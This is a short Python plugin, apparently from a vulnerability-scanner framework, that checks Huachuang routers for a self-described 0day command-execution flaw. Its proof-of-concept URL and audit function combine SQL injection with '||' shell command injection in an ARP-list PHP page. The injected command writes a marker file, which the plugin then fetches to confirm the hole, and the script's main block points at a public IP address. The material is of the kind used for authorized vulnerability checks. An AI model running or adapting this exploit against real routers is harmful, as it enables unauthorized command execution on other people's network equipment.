#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 华创路由器命令执行0day
refer: 0day
description:
    写个插件还要自己挖0day我容易么我，你们轻点刷行不行啊！！！
POC:
    http://foobar/acc/bindipmac/static_arp_list_action.php?chkSysArpList[0]=0&sysArpEth[0]=1' and 0 union select 'a||echo hehehe>testvul.txt||b--&sysArpIp[0]=1&sysArpMac[0]=1
'''

import urlparse


def assign(service, arg):
    if service == 'huachuang_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'acc/bindipmac/static_arp_list_action.php?chkSysArpList[0]=0&sysArpEth[0]=1%27%20and%200%20union%20select%20%27a||echo%20hehehe>testvul.txt||b--&sysArpIp[0]=1&sysArpMac[0]=1'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200:
        code, head, res, err, _ = curl.curl2(arg + 'acc/bindipmac/testvul.txt')
        if code == 200 and 'hehehe' in res:
            security_hole('命令执行: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('huachuang_router','http://118.26.68.2/')[1])